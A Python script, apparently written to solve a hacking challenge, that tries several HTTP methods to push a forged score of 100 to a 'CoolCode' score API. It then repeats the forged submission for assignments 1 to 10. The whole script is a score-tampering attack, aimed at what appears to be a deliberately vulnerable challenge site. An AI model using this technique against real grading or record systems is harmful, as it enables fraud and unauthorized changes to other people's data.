#!/usr/bin/env python3
"""
Simple CoolCode API Tester
Direct approach to test the score override API
"""

import requests
import json

def test_score_api():
    """Test the score API with minimal approach"""
    
    # Configuration from challenge
    username = "CX8de3ce71-3cbTY"
    api_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
    
    print("🔥 CoolCode Score API Tester 🔥")
    print("=" * 40)
    print(f"Username: {username}")
    print(f"API URL: {api_url}")
    print("=" * 40)
    
    # Test payload
    payload = {
        "username": username,
        "assignmentId": 1,
        "score": 100
    }
    
    print(f"Test payload: {json.dumps(payload, indent=2)}")
    print("-" * 40)
    
    # Different approaches to try
    approaches = [
        {
            "name": "1. Direct POST (JSON)",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps(payload)
        },
        {
            "name": "2. POST with form data",
            "method": "POST", 
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": f"username={username}&assignmentId=1&score=100"
        },
        {
            "name": "3. PUT method",
            "method": "PUT",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps(payload)
        },
        {
            "name": "4. PATCH method",
            "method": "PATCH",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps(payload)
        },
        {
            "name": "5. GET with query params",
            "method": "GET",
            "headers": {},
            "params": payload
        }
    ]
    
    successful_approaches = []
    
    for approach in approaches:
        print(f"\nTesting: {approach['name']}")
        print(f"Method: {approach['method']}")
        print(f"Headers: {approach['headers']}")
        
        try:
            # Make request with timeout
            if approach['method'] == 'GET':
                response = requests.get(
                    api_url, 
                    params=approach.get('params', {}),
                    headers=approach['headers'],
                    timeout=10
                )
            else:
                response = requests.request(
                    approach['method'],
                    api_url,
                    data=approach.get('data', ''),
                    headers=approach['headers'],
                    timeout=10
                )
            
            print(f"Status: {response.status_code}")
            response_text = response.text[:200] + "..." if len(response.text) > 200 else response.text
            print(f"Response: {response_text}")
            
            if response.status_code == 200:
                print("🎉 SUCCESS! This approach works!")
                successful_approaches.append(approach)
            elif response.status_code == 405:
                print("❌ 405 Method Not Allowed")
            elif response.status_code == 401:
                print("🔒 401 Unauthorized")
            elif response.status_code == 403:
                print("🚫 403 Forbidden")
            elif response.status_code == 404:
                print("❓ 404 Not Found")
            else:
                print(f"ℹ️ Other status: {response.status_code}")
                
        except requests.exceptions.Timeout:
            print("⏰ Request timed out")
        except requests.exceptions.ConnectionError:
            print("🌐 Connection error")
        except Exception as e:
            print(f"💥 Error: {e}")
    
    print("\n" + "=" * 40)
    print("SUMMARY")
    print("=" * 40)
    
    if successful_approaches:
        print(f"✅ Found {len(successful_approaches)} working approach(es)!")
        for approach in successful_approaches:
            print(f"   - {approach['name']}")
        
        # If we found a working approach, try to hack multiple assignments
        print("\n🚀 Attempting to hack assignments 1-10...")
        working_approach = successful_approaches[0]
        
        for assignment_id in range(1, 11):
            test_payload = {
                "username": username,
                "assignmentId": assignment_id,
                "score": 100
            }
            
            try:
                if working_approach['method'] == 'GET':
                    response = requests.get(
                        api_url,
                        params=test_payload,
                        headers=working_approach['headers'],
                        timeout=5
                    )
                else:
                    data = json.dumps(test_payload) if working_approach['headers'].get('Content-Type') == 'application/json' else f"username={username}&assignmentId={assignment_id}&score=100"
                    response = requests.request(
                        working_approach['method'],
                        api_url,
                        data=data,
                        headers=working_approach['headers'],
                        timeout=5
                    )
                
                if response.status_code == 200:
                    print(f"✅ Assignment {assignment_id}: SUCCESS")
                else:
                    print(f"❌ Assignment {assignment_id}: {response.status_code}")
                    
            except Exception as e:
                print(f"💥 Assignment {assignment_id}: Error - {e}")
        
    else:
        print("❌ No working approaches found")
        print("\n💡 Next steps:")
        print("1. Open browser and go to: https://coolcode-hacker-34c5455cd908.herokuapp.com/ui")
        print("2. Login with your credentials")
        print("3. Open browser dev tools (F12)")
        print("4. Look in Network tab for API calls")
        print("5. Try to submit an assignment or look for score-related requests")
        print("6. Copy the working request format")

if __name__ == "__main__":
    test_score_api()
